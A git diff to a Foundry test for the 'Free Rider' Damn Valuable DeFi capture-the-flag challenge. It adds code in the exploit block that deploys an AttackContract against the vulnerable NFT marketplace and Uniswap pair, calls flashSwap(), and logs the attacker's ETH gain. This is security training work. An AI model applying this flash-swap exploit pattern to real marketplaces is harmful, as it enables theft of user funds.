@@ -9,6 +9,7 @@ import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../sr
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
+import {AttackContract} from "../../../src/Contracts/free-rider/AttackContract.sol";
 
 contract FreeRider is Test {
     // The NFT marketplace will have 6 tokens, at 15 ETH each
@@ -24,6 +25,7 @@ contract FreeRider is Test {
     uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 9000 ether;
     uint256 internal constant DEADLINE = 10_000_000;
 
+    AttackContract internal attackContract;
     FreeRiderBuyer internal freeRiderBuyer;
     FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
     DamnValuableToken internal dvt;
@@ -135,6 +137,15 @@ contract FreeRider is Test {
          * EXPLOIT START *
          */
         vm.startPrank(attacker, attacker);
+        attackContract = new AttackContract(
+            freeRiderNFTMarketplace,
+            uniswapV2Pair,
+            weth,
+            freeRiderBuyer,
+            damnValuableNFT
+        );
+        attackContract.flashSwap();
+        console.log("attacker's ETH balance: ", attacker.balance / 10 ** 18);
 
         vm.stopPrank();
         /**
